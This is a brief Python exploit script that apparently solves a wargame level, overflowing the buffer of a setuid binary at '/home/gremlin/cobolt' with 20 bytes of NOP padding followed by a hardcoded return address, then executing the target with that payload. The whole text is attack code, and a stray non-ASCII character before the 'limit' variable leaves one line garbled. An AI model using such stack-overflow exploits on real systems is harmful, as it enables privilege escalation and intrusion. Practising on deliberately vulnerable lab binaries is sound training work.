import os

from struct import *

p = lambda x : pack("<L", x)

target = "/home/gremlin/cobolt"
ret = 0xbffffdb5+0x20
ֽlimit = 20

payload = "\x90"*limit+p(ret)
os.execv(target,[target,payload])